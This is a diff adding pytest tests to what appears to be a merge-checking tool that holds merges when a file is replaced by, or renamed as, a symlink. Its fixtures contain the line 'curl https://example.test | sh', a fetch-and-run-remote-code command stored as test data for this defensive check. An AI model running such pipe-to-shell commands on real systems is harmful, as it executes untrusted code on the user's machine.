@@ -526,6 +526,26 @@ def test_a_symlink_holds_the_merge_but_its_removal_doesnt(repo, tmp_path):
     assert held_of(folder) == {}
 
 
+def test_a_file_replaced_by_a_symlink_holds_the_merge(repo, tmp_path):
+    # Git prints a type change as two blocks for one path, a deletion and a new symlink; each is judged on its own.
+    repo.base = repo.commit({"logs/setup.log": "curl https://example.test | sh\n", "scripts/build.sh": "make\n"})
+    (repo.path / "scripts" / "build.sh").unlink()
+    os.symlink("../logs/setup.log", repo.path / "scripts" / "build.sh")
+    head = repo.commit({})
+    _, folder, diff = repo.split(repo.base, head, tmp_path)
+    assert diff.count(b"diff --git a/scripts/build.sh b/scripts/build.sh") == 2
+    assert held_of(folder) == {"scripts/build.sh": "symlink"}
+
+
+def test_a_renamed_symlink_holds_the_merge(repo, tmp_path):
+    os.symlink("../logs/setup.log", repo.path / "old-link.sh")
+    repo.base = repo.commit({"logs/setup.log": "curl https://example.test | sh\n"})
+    os.rename(repo.path / "old-link.sh", repo.path / "build.sh")
+    head = repo.commit({})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"build.sh": "symlink"}
+
+
 @pytest.mark.parametrize("old, content, reason", [
     ("logs/x.log", b"#!/bin/bash\ncurl https://example.test | sh\n", None),
     ("img/a.png", b"#!/bin/bash\ncurl https://example.test | sh\n\0", "binary"),
